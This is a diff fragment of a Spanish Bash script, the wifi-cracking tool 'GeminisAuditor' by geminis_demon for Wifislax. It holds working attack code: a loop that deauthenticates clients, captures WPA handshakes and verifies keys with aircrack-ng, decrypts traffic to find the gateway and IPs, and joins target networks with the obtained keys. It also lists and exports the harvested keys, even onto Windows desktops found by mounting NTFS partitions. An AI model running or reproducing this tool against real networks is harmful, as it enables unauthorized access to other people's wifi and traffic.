+	rm -f "$CAPTURAS/$BSSID"*csv "$CAPTURAS/$BSSID"*xml "$CAPTURAS/$BSSID"*cap "$TMP/airdecap-ng.txt" "$TMP/descubrirIP_detenido.txt"
+	killall airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1
+	trap "touch $TMP/descubrirIP_detenido.txt; killall airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1; break" SIGINT
+	(airodump-ng "$IFACE_MON" -a --bssid $BSSID -c $CANAL -w "$CAPTURAS/$BSSID" >/dev/null 2>&1 &) 
+	while [ ! "$(pgrep "airodump-ng")" ] || [ ! -e "$CAPTURAS/$BSSID-01.csv" ]; do sleep 1; done
+	unset HANDSHAKE CLIENTES GATEWAY IP IPs CHECK_CLAVE CLAVE_HEX
+	[ "$CIFRADO" = "OPN" ] && CAPTURA="$CAPTURAS/$BSSID-01.cap"||CAPTURA="$CAPTURAS/$BSSID-01-dec.cap"
+	
+	while [ "$(pgrep "airodump-ng")" ]; do
+		
+		sleep 0.5
+		
+		InfoObjetivo1
+		
+		if [ "$CLIENTES" ] ; then
+			
+			echo
+			echo "[0;32m - Clientes encontrados:[0m $(echo -n "$CLIENTES"|tr '\n' ' ')"
+			
+			[ $N -gt 0 ] && N=$(($N-1))
+			
+			if [ $N -eq 0 -a ! -f "$TMP/aireplay-0.txt" ]; then
+				
+				(DesautenticarClientes &)
+				N=40
+			fi
+			
+			if [ -f "$TMP/aireplay-0.txt" ]; then
+				
+				echo
+				echo "[0;32m - Desautenticando clientes...[0m"
+			fi
+		else
+			echo
+			echo "[0;32m - Esperando clientes...[0m"
+			
+			CLIENTES="$(grep "$BSSID" "$CAPTURAS/$BSSID-01.csv"|egrep -v "^$BSSID|not associated"|awk -F ',' '{print $1}')"
+		fi
+		
+		if [ "${CIFRADO:0:3}" != "OPN" ]; then
+			
+			if [ "${CIFRADO:0:3}" = "WPA" ]; then
+				
+				if [ "$HANDSHAKE" ]; then
+					
+					echo
+					echo "[0;32m - Handshake capturado[0m"
+					
+					[ -e "$CAPTURAS/$BSSID-01.cap" ] && airdecap-ng -e "$ESSID" -p "$CLAVE" "$CAPTURAS/$BSSID-01.cap" >"$TMP/airdecap-ng.txt"
+				else
+					echo
+					echo "[0;32m - Esperando handshake...[0m"
+					
+					[ $DATA -ne 0 ] && HANDSHAKE="$(aircrack-ng "$CAPTURAS/$BSSID-01.cap" 2>/dev/null|grep "1 handshake")"
+				fi
+				
+			elif [ "${CIFRADO:0:3}" = "WEP" ]; then
+				
+				if [ "$(grep "Invalid WEP key length" "$TMP/airdecap-ng.txt")" ]; then
+					
+					[ ! "$CLAVE_HEX" ] && CLAVE_HEX="$(echo -n "$CLAVE"| od -t x1|head -1|cut -d' ' -f2-|tr -d ' ')" && CLAVE="$CLAVE_HEX"
+				fi
+				
+				[ -e "$CAPTURAS/$BSSID-01.cap" ] && airdecap-ng -w "$CLAVE" "$CAPTURAS/$BSSID-01.cap" >"$TMP/airdecap-ng.txt"
+			fi
+			
+			if [ "$CHECK_CLAVE" = "OK" ]; then
+				
+				echo
+				echo "[0;32m - Clave ${CIFRADO:0:3} correcta[0m"
+				
+			elif [ "$CHECK_CLAVE" = "ERROR" ]; then
+				
+				echo
+				echo "[0;31m - Clave ${CIFRADO:0:3} incorrecta, no se puede continuar[0m"
+				
+				break
+			else
+				echo
+				echo "[0;32m - Clave ${CIFRADO:0:3} no comprobada...[0m"
+				
+				if [ "${CIFRADO:0:3}" = "WEP" -a $DATA -ge 4 ] || [ "${CIFRADO:0:3}" = "WPA" -a "$HANDSHAKE" ]; then
+					
+					[ "$(aircrack-ng -K -b "$BSSID" -w "$TMP/CHECK_CLAVE.txt" "$CAPTURAS/$BSSID-01.cap"|grep "Passphrase not in dictionary")" ] && CHECK_CLAVE="ERROR"||CHECK_CLAVE="OK"
+				fi
+			fi
+		fi
+		
+		echo
+		echo "[0;32m - Esperando paquetes ARP...[0m"
+		
+		if [ $DATA -gt 0 ] && [ -e "$CAPTURA" ]; then
+			
+			GATEWAY="$(tcpdump arp -r "$CAPTURA" 2>/dev/null|egrep -iom1 "([0-9]{1,3}\.){3}[0-9]{1,3} is-at ${BSSID:0:8}"|awk '{print $1}')"
+			IPs="$(tcpdump arp -r "$CAPTURA" 2>/dev/null|egrep -o "([0-9]{1,3}\.){3}[0-9]{1,3}"|sort -u|tr '\n' ' ')"
+		fi
+		
+		if [ "$IPs" ]; then
+			
+			echo
+			echo "[0;32m - IPs encontradas:[0m $IPs"
+		fi
+		
+		if [ "$GATEWAY" ]; then
+			
+			LINEA="$(grep -n "^GATEWAY" "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"|cut -d':' -f1)"
+			[ "$LINEA" ] && sed -i "${LINEA}d" "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+			
+			echo "GATEWAY: $GATEWAY" >>"$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+			echo
+			echo "[0;32m - Gateway encontrado:[0m $GATEWAY"
+			echo
+			echo "[0;32m - El gateway ha sido guardado en:[0m $CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+			
+			break
+		fi
+	done
+	
+	if [ -f "$TMP/descubrirIP_detenido.txt" ]; then
+		
+		rm -f "$TMP/descubrirIP_detenido.txt"
+		
+		echo
+		echo "[0;31m - Se ha detenido el proceso[0m"
+	fi
+	
+	echo
+	echo "[0;32m - Presiona cualquier tecla para volver al menú principal[0m"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		break
+	done
+	
+	killall airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1
+	MenuPrincipal
+	
+}
+
+ConectarConAP() {
+	
+	DesconectarAP() {
+		
+		echo
+		echo -n " - Cerrando procesos... "
+		
+		killall wpa_supplicant dhcpcd 2>/dev/null
+		sleep 1
+		
+		echo "[0;32m√ [0m"
+		
+		[ "$IFACE_CONECTADA" ] && IFACE="$IFACE_CONECTADA"
+		ResetInterface
+		unset IFACE
+	}
+	
+	ErrorConectarConAP() {
+		
+		echo "[0;31mERROR[0m"
+		echo
+		echo  "[0;31m - No ha sido posible conectar con $ESSID[0m"
+		
+		DesconectarAP
+		
+		echo
+		echo " - Presiona cualquier tecla para volver al menú principal"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			break
+		done
+		
+		MenuPrincipal
+	}
+	
+	read IFACE_CONECTADA ESSID_CONECTADO <<<"$(iwconfig 2>/dev/null|tr '"' ' '|grep -v "ESSID:off/any"|grep -m1 "ESSID:"|awk '{print $1,$5}')"
+	
+	if [ "$IFACE_CONECTADA" ]; then
+		
+		SELECT=1
+		
+		while [ $GUARDAR -eq 0 ]; do
+			
+			Clear
+			Cabecera
+			unset RESALTAR
+			RESALTAR[$SELECT]="[48;5;21m"
+			
+			echo
+			echo " [0;32mDesconectar punto de acceso[0m"
+			echo
+			echo " ${RESALTAR[1]}▶ Desconectarse de $ESSID_CONECTADO[0m"
+			echo
+			echo " ${RESALTAR[2]}◀ Volver al menú principal[0m"
+			
+			while read -sn1 TECLA; do
+				
+				LeerTecla
+				
+				case "$TECLA" in
+					
+					$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+					$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 2 ] && SELECT=$(($SELECT+1)); break;;
+					$'\e[D'|a|A) MenuPrincipal; break;;
+				     ''|$'\e[C'|d|D) 
+							case $SELECT in
+								
+								1) GUARDAR=1; break;;
+								2) MenuPrincipal; break;;
+							esac
+				esac
+			done
+		done
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		DesconectarAP
+		sleep 1
+		MenuPrincipal
+	fi
+	
+	SeleccionarObjetivo
+	SeleccionarInterfaceAuto
+	
+	if [ "$CIFRADO" != "OPN" ]; then
+		
+		if [ -f "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt" ]; then
+			
+			CLAVE="$(cat "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"|tr -d '\r'|sed 's/ $//g'|egrep "^CLAVE HEX|^CLAVE WEP|^CLAVE WPA"|tail -1|cut -d' ' -f3-)"
+		else
+			Clear
+			Cabecera
+			sleep 0.5
+			
+			echo
+			read -p " - Introduce la clave ${CIFRADO:0:3}: " CLAVE
+			
+			sleep 1
+		fi
+	fi
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	killall wpa_supplicant dhcpcd 2>/dev/null
+	ResetInterface
+	
+	echo
+	echo -n " - Conectando con $ESSID... "
+	
+	case ${CIFRADO:0:3} in
+		
+		WPA)
+			wpa_passphrase "$ESSID" "$CLAVE" >"$TMP/wpa_supplicant.conf"
+			(wpa_supplicant -i "$IFACE" -D wext -c "$TMP/wpa_supplicant.conf" -f "$TMP/wpa_supplicant.txt" -P "$TMP/wpa_supplicant.pid" 2>/dev/null &)
+		;;
+		
+		WEP)
+			[ ${#CLAVE} -eq 5 ] && KEY="s:$CLAVE"||KEY="$CLAVE"
+			iwconfig "$IFACE" essid "$ESSID" ap "$BSSID" key "$KEY"
+		;;
+		
+		OPN)
+			iwconfig "$IFACE" essid "$ESSID" ap "$BSSID"
+		;;
+	esac
+	
+	unset CONECTADO
+	X=30; Y=0; while [ $X -ge 0 ]; do [ "$(iwconfig "$IFACE"|grep "Link Quality")" ] && Y=1 && break; sleep 1; X=$(($X-1));done
+	[ $Y -eq 1 ] && echo "[0;32m√ [0m"||ErrorConectarConAP
+	
+	echo
+	echo -n " - Obteniendo dirección IP... "
+	
+	(dhcpcd "$IFACE" &>"$TMP/dhcpcd.txt" &)
+	X=30; Y=0; while [ $X -ge 0 ]; do [ "$(ip route|grep "$IFACE")" ] && Y=1 && break; sleep 1; X=$(($X-1));done
+	[ $Y -eq 1 ] && echo "[0;32m√ [0m"||ErrorConectarConAP
+	(sleep 5; ntpdate pool.ntp.org &>/dev/null &)
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE
+	unset IFACE
+	
+	echo
+	echo " - Conectado correctamente a $ESSID"
+	echo
+	echo " - Presiona cualquier tecla para volver al menú principal"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		break
+	done
+	
+	MenuPrincipal
+}
+
+MenuUtilidades() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	SELECT=1
+	GUARDAR=0
+	while [ $GUARDAR -eq 0 ]; do
+		
+		Clear
+		Cabecera
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		
+		echo
+		echo " [0;32mOtras utilidades[0m"
+		echo
+		echo " ${RESALTAR[1]}▶ Cambiar dirección MAC[0m"
+		echo " ${RESALTAR[2]}▶ Descubrir rango de IP[0m"
+		echo " ${RESALTAR[3]}▶ Conectar/desconectar a un AP[0m"
+		echo
+		echo " ${RESALTAR[4]}◀ Volver al menú principal[0m"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 4 ] && SELECT=$(($SELECT+1)); break;;
+				$'\e[D'|a|A) GUARDAR=1; break;;
+			     ''|$'\e[C'|d|D)
+					case $SELECT in
+						
+						1) CambiarMAC; break;;
+						2) DescubrirIP; break;;
+						3) ConectarConAP; break;;
+						4) GUARDAR=1; break;;
+					esac
+				;;
+			esac
+		done
+	done
+	
+	MenuPrincipal
+}
+
+##########################################################################
+##########################################################################
+
+ListarClaves() {
+	
+	Exportar2USB() {
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		LIVE_WIFISLAX="$(cat /var/log/wifislax-livedbg|grep '/wifislax$'|sed 's#/wifislax$##')"
+		[ ! -d "$LIVE_WIFISLAX" ] && LIVE_WIFISLAX="$(echo "$LIVE_WIFISLAX"|sed 's#^#/mnt/live#')"
+		
+		if [ ! -f "$LIVE_WIFISLAX/wifislax/wifislax.sgn" ] || [ "$(echo "$LIVE_WIFISLAX"|grep "/mnt/sr[0-9]")" ]; then
+			
+			echo
+			echo "[0;31m - Esta función solo está disponible en modo Live-USB, no se puede continuar[0m"
+			
+			sleep 3
+		else
+			cat "$TMP/CLAVES_WIFI.txt"|sed 's/$/\r/' >"$LIVE_WIFISLAX/CLAVES_WIFI_$(date +"%d-%m-%Y_%H-%M-%S").txt"
+			echo
+			echo " - El listado ha sido guardado en \"$LIVE_WIFISLAX/CLAVES_WIFI_$(date +"%d-%m-%Y_%H-%M-%S").txt\""
+			echo
+			echo " - Presiona cualquier tecla para continuar"
+			echo
+			
+			while read -sn1 TECLA; do
+				
+				LeerTecla
+				break
+			done
+		fi
+	}
+	
+	Exportar2Windows() {
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		unset MNT ESCRITORIO ESCRITORIOS ESCRITORIOS_WINDOWS
+		rm -rf "$TMP/ESCRITORIOS_WINDOWS.txt"
+		
+		blkid|grep 'TYPE="ntfs"'|cut -d':' -f1|while read DEVICE; do
+			
+			MNT="$(mount|grep "$DEVICE"|cut -d' ' -f3)"
+			
+			if [ ! -d "$MNT" ]; then
+				
+				MNT="/mnt/$(echo "$DEVICE"|cut -d'/' -f3)"
+				mkdir -p "$MNT"
+				mount -t ntfs "$DEVICE" "$MNT"
+				if [ $? -ne 0 ]; then
+					
+					echo
+					echo "[0;31m - Ocurrió un error al intentar montar $DEVICE[0m"
+					echo
+					echo " - Presiona cualquier tecla para continuar"
+					echo
+					
+					while read -sn1 TECLA; do
+						
+						LeerTecla
+						break
+					done
+					
+					continue
+				fi
+			fi
+			
+			if [ -d "$MNT/Windows/System32/" ]; then
+				
+				if [ -d "$MNT/Users" ]; then
+					
+					X="Users"
+					
+				elif [ -d "$MNT/Documents and Settings" ]; then
+					
+					X="Documents and Settings"
+				fi
+				
+				for ESCRITORIO in "$MNT/$X"/*/Desktop; do echo "$ESCRITORIO"; done >>"$TMP/ESCRITORIOS_WINDOWS.txt"
+			fi
+		done
+		
+		if [ ! "$(cat "$TMP/ESCRITORIOS_WINDOWS.txt")" ]; then
+			
+			echo
+			echo "[0;31m - No se encontró ningun SO Windows en este equipo, no se puede continuar[0m"
+			
+			sleep 3
+			MenuPrincipal
+		fi
+		
+		N=0
+		while read ESCRITORIO; do
+			
+			N=$(($N+1))
+			ESCRITORIO[$N]="$ESCRITORIO"
+			
+		done <"$TMP/ESCRITORIOS_WINDOWS.txt"
+		
+		SELECT=1
+		GUARDAR=0
+		while [ $GUARDAR -eq 0 ]; do
+			
+			unset RESALTAR
+			RESALTAR[$SELECT]="[48;5;21m"
+			Clear
+			Cabecera
+			
+			echo
+			echo  " [0;32mSelecciona el escritorio en el que se guardarán las claves[0m"
+			echo
+			
+			for ((X=1;$X<=$N;X++)); do
+				
+				echo " ${RESALTAR[$X]}▶ ${ESCRITORIO[$X]}[0m"
+			done
+			
+			echo
+			echo " ${RESALTAR[$(($N+1))]}◀ Volver al listado[0m"
+			
+			while read -sn1 TECLA; do
+				
+				LeerTecla
+				
+				case "$TECLA" in
+					
+					$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+					$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt $(($N+1)) ] && SELECT=$(($SELECT+1)); break;;
+					$'\e[D'|a|A) ListarClaves; break;;
+				     ''|$'\e[C'|d|D) GUARDAR=1; ESCRITORIO="${ESCRITORIO[$SELECT]}"; break;; 
+				esac
+			done
+		done
+		
+		cat "$TMP/CLAVES_WIFI.txt"|sed 's/$/\r/' >"$ESCRITORIO/CLAVES_WIFI_$(date +"%d-%m-%Y_%H-%M-%S").txt"
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		
+		echo
+		echo " - El listado ha sido guardado en \"$ESCRITORIO/CLAVES_WIFI_$(date +"%d-%m-%Y_%H-%M-%S").txt\""
+		echo
+		echo " - Presiona cualquier tecla para continuar"
+		echo
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			break
+		done
+	}
+	
+	Exportar2Wifislax() {
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		
+		cat "$TMP/CLAVES_WIFI.txt"|sed 's/$/\r/' >"$HOME/Desktop/CLAVES_WIFI_$(date +"%d-%m-%Y_%H-%M-%S").txt"
+		echo
+		echo " - El listado ha sido guardado en \"$HOME/Desktop/CLAVES_WIFI_$(date +"%d-%m-%Y_%H-%M-%S").txt\""
+		echo
+		echo " - Presiona cualquier tecla para continuar"
+		echo
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			break
+		done
+	}
+	
+	Clear
+	
+	if [ ! "$(ls "$CLAVES"|grep ".txt$")" ]; then
+		
+		Cabecera
+		sleep 0.5
+		
+		echo
+		echo "[0;31m - No existen claves guardadas, no se puede continuar[0m"
+		echo
+		
+		sleep 3
+		MenuPrincipal
+	fi
+	
+	for X in "$CLAVES"/*.txt; do
+		
+		TXT="$(cat "$X"|tr -d '\r'|sed 's/ $//g')"
+		xESSID="$(echo "$TXT"|grep "^ESSID"|cut -d ' ' -f2-)"
+		xCLAVE="$(echo "$TXT"|egrep -m1 "^CLAVE WEP|^CLAVE HEX|^CLAVE WPA"|cut -d' ' -f3-)"
+		
+		echo "$xESSID▶$xCLAVE"
+		
+	done\
+	|awk 'BEGIN { print " ESSID                         CLAVE\n ----------------------------------------------------------- " }\
+	{ printf "%-30s %-30s\n"," "$1, $2 }' FS='▶' >"$TMP/CLAVES_WIFI.txt"
+	
+	CLAVES_WIFI_TXT="$(cat "$TMP/CLAVES_WIFI.txt")"
+	N_CLAVES="$(ls "$CLAVES"|grep ".txt$"|wc -l)"
+	
+	SELECT=1
+	GUARDAR=0
+	while [ $GUARDAR -eq 0 ]; do
+		
+		Clear
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		
+		echo " [0;32mListado de claves[0m [$N_CLAVES claves obtenidas]"
+		echo
+		echo "$CLAVES_WIFI_TXT"
+		echo " ----------------------------------------------------------- "
+		echo
+		echo " ${RESALTAR[1]}▶ Exportar a Live-USB[0m"
+		echo " ${RESALTAR[2]}▶ Exportar a escritorio de Windows[0m"
+		echo " ${RESALTAR[3]}▶ Exportar a escritorio de Wifislax[0m"
+		echo
+		echo " ${RESALTAR[4]}◀ Volver al menú principal[0m"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 4 ] && SELECT=$(($SELECT+1)); break;;
+				$'\e[D'|a|A) GUARDAR=1; break;;
+			     ''|$'\e[C'|d|D)
+					case $SELECT in
+						
+						1) Exportar2USB; ListarClaves; break;;
+						2) Exportar2Windows; ListarClaves; break;;
+						3) Exportar2Wifislax; ListarClaves; break;;
+						4) GUARDAR=1; break;;
+					esac
+				;;
+			esac
+		done
+	done
+	
+	MenuPrincipal
+}
+
+ActualizarBD() {
+	
+	DB_LOCAL="$(cat "$HOME/swireless/patrones_conocidos.txt" 2>/dev/null|grep "^# VERSION [0-9]*$"|awk '{print $3}')"
+	DB_REMOTA="$(timeout -s SIGTERM 3 curl -s "http://downloadwireless.net/scripts-live/patrones_conocidos.txt"|grep "^# VERSION [0-9]*$"|awk '{print $3}')"
+	
+	[ ! "$DB_REMOTA" ] && return
+	
+	if [ ! "$DB_LOCAL" ] || [ $DB_LOCAL -lt $DB_REMOTA ]; then
+		
+		[ ! -d "$HOME/swireless" ] && rm -rf "$HOME/swireless" && mkdir -p "$HOME/swireless"
+		timeout -s SIGTERM 3 curl -s "http://downloadwireless.net/scripts-live/patrones_conocidos.txt" >"$HOME/swireless/patrones_conocidos.txt"
+		[ $? -ne 0 ] && return
+		DB_LOCAL=$DB_REMOTA
+		
+		Clear
+		Cabecera
+		sleep 0.3
+		
+		echo
+		echo " - La base de datos ha sido actualizada a la versión $DB_LOCAL"
+		echo
+		
+		if [ "$(which dir2xzm)" ]; then
+			
+			while true; do
+				
+				read -p " - ¿Guardar en un módulo XZM? (s/n) " SN
+				
+				if [ "$SN" = "S" -o "$SN" = "s" ]; then
+					
+					mkdir -p "$TMP/patrones-conocidos-$DB_LOCAL-noarch-1sw$HOME/swireless"
+					cp -f "$HOME/swireless/patrones_conocidos.txt" "$TMP/patrones-conocidos-$DB_LOCAL-noarch-1sw$HOME/swireless"
+					dir2xzm "$TMP/patrones-conocidos-$DB_LOCAL-noarch-1sw" "$HOME/Desktop/patrones-conocidos-$DB_LOCAL-noarch-1sw.xzm" >/dev/null 2>&1
+					
+					echo
+					echo " - Se ha creado un módulo en $HOME/Desktop/patrones-conocidos-$DB_LOCAL-noarch-1sw.xzm"
+					
+					break
+					
+				elif [ "$SN" = "N" -o "$SN" = "n" ]; then
+					
+					break
+				fi
+				
+				Clear
+			done
+		fi
+		
+		echo
+		echo " - Presiona cualquier tecla para continuar"
+		
+		LeerTecla
+	fi
+}
+
+Salir() {
+	
+	( [ "$IFACE_MON" ] && ResetInterface &>/dev/null
+	[ "$(which nmcli)" ] && nmcli device set "$IFACE" managed yes 2>/dev/null & )
+	exit
+}
+
+Cabecera() {
+	
+	echo "[38;05;21m    ___               _       _        _             _ _ _"
+	echo "   / _ \___ _ __ ___ (_)_ __ (_)___   /_\  _   _  __| (_) |_ ___  _ __"
+	echo "  / /_\/ _ \ '_ \` _ \| | '_ \| / __| //_\\\\| | | |/ _\` | | __/ _ \| '__|"
+	echo " / /_\\\\  __/ | | | | | | | | | \__ \/  _  \ |_| | (_| | | || (_) | |"
+	echo " \____/\___|_| |_| |_|_|_| |_|_|___/\_/ \_/\__,_|\__,_|_|\__\___/|_|[0m"
+	echo " ----------------------------------------------------------------------"
+	echo " [38;05;21m  By geminis_demon  [0m|[38;05;21m  Versión script: $VERSION  [0m|[38;05;21m  Versión DB: $DB_LOCAL[0m"
+	echo " ----------------------------------------------------------------------"
+}
+
+MenuPrincipal() {
+	
+	InfoLocal() {
+		
+		if [ -f "/sys/class/net/$IFACE/address" ]; then
+			
+			IFACE_MAC="$(cat "/sys/class/net/$IFACE/address"|tr '[:lower:]' '[:upper:]')"
+			
+		elif [ -f "/sys/class/net/${IFACE}mon/address" ]; then
+			
+			IFACE_MAC="$(cat "/sys/class/net/${IFACE}mon/address")"
+		fi
+		
+		echo " INFO. LOCAL:"
+		echo "                 Interfaz wifi = $IFACE"
+		echo "                 Dirección MAC = $IFACE_MAC"
+		echo "                    Fabricante = $FABRICANTE_WIFI"
+		echo "                        Driver = $DRIVER_WIFI"
+		echo "                     Objetivos = $( [ "$N_OBJETIVOS" ] && echo "$N_OBJETIVOS"|| echo "0")"
+		echo "                        Claves = $(ls "$CLAVES"|grep ".txt$"|wc -l)"
+	}
+	
+	InfoObjetivo() {
+		
+		FABRICANTE="$(grep -m1 "$(echo "${BSSID:0:8}"|tr ':' '-')" "/etc/aircrack-ng/airodump-ng-oui.txt" 2>/dev/null|awk -F'\t' '{print $3}')"
+		[ ! "$FABRICANTE" ] && FABRICANTE="Desconocido"
+		
+		echo " INFO. OBJETIVO:"
+		echo "                         ESSID = $ESSID"
+		echo "                         BSSID = $BSSID"
+		echo "                    Fabricante = $FABRICANTE"
+		echo "                         Canál = $CANAL"
+		echo "                       Cifrado = $CIFRADO"
+		echo "                           WPS = $WPS"
+		
+		if [ -f "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt" ]; then
+			
+			CLAVE="$(cat "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"|tr -d '\r'|sed 's/ $//g'|egrep -m1 "^CLAVE WEP|^CLAVE HEX|^CLAVE WPA"|cut -d' ' -f3-)"
+			echo "                     CLAVE ${CIFRADO:0:3} = [0;32m$CLAVE[0m"
+		fi
+	}
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	trap "Salir" SIGHUP SIGILL
+	[ ! "$ESSID" -o "$ESSID" = "< Oculto >" ] && unset ESSID BSSID
+	[ "$IFACE" ] && INFO_LOCAL="$(InfoLocal)"||unset INFO_LOCAL
+	[ "$BSSID" ] && INFO_OBJETIVO="$(InfoObjetivo)"||unset INFO_OBJETIVO
+	
+	SELECT=1
+	while true; do
+		
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		Clear
+		Cabecera
+		
+		[ "$INFO_LOCAL" ] && echo "$INFO_LOCAL"
+		[ "$INFO_OBJETIVO" ] && echo "$INFO_OBJETIVO"
+		[ "$INFO_OBJETIVO" -o "$INFO_LOCAL" ] && echo " ----------------------------------------------------------------------"
+		echo " ${RESALTAR[1]}▶ Escanear en busca de objetivos[0m"
+		echo " ${RESALTAR[2]}▶ Atacar objetivo seleccionado[0m"
+		echo " ${RESALTAR[3]}▶ Seleccionar otro objetivo[0m"
+		echo " ${RESALTAR[4]}▶ Seleccionar interfaz wifi[0m"
+		echo " ${RESALTAR[5]}▶ Listar claves obtenidas[0m"
+		echo " ${RESALTAR[6]}▶ Configurar parámetros[0m"
+		echo " ${RESALTAR[7]}▶ Otras utilidades[0m"
+		echo
+		echo " ${RESALTAR[8]}◀ Salir[0m"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 8 ] && SELECT=$(($SELECT+1)); break;;
+				$'\e[D'|a|A) Salir;;
+			     ''|$'\e[C'|d|D)
+					
+					case $SELECT in
+						
+						1) EscanearObjetivos; MenuPrincipal; break;;
+						2) SeleccionarAtaque; break;;
+						3) SeleccionarObjetivo; MenuPrincipal; break;;
+						4) SeleccionarInterface; MenuPrincipal; break;;
+						5) ListarClaves; break;;
+						6) MenuConfiguracion; break;;
+						7) MenuUtilidades; break;;
+						8) Salir; break;;
+					esac
+				;; 
+			esac
+		done
+	done
+}
+
+LeerTecla() {
+	
+	read -sn1 -t 0.001 X1
+	read -sn1 -t 0.001 X2
+	read -sn1 -t 0.001 X3
+	read -sn1 -t 0.001 X4
+	read -sn1 -t 0.001 X5
+	read -sn1 -t 0.001 X6
+	read -sn1 -t 0.001 X7
+	read -sn1 -t 0.001 X8
+	read -sn1 -t 0.001 X9
+	TECLA+=${X1}${X2}${X3}${X4}${X5}${X6}${X7}${X8}${X9}
+}
+
+Clear() {
+	
+	echo -n "[1;0H"
+	tput ed
+}
+
+rm -rf "$TMP"
+
+for DIRECTORIO in $CLAVES $TMP $CAPTURAS $DICCIONARIOS $SESIONES; do
+	
+	[ ! -d "$DIRECTORIO" ] && rm -f "$DIRECTORIO" && mkdir -p "$DIRECTORIO"
+done
+
+if [ -d "/opt/Wireless-Keys" ] && [ ! -d "/opt/Wireless-Keys/GeminisAuditor" ]; then
+	
+	ln -s "$CLAVES" "/opt/Wireless-Keys/GeminisAuditor"
+	echo -e "[Desktop Entry]\nIcon=GeminisAuditor" >"/opt/Wireless-Keys/GeminisAuditor/.directory"
+fi
+
+if [ -f "$RAIZ/config.sh" ]; then
+	
+	source "$RAIZ/config.sh"
+else
+	SCAN_TIME=30
+	SCAN_CHANNEL=0
+	PPS=100
+	FABRICANTES="NO"
+	FILTRO="NO"
+	AIRMON_NG="airmon-ng"
+	ESCANER="airodump-ng"
+fi
+
+ActualizarBD
+MenuPrincipal
+
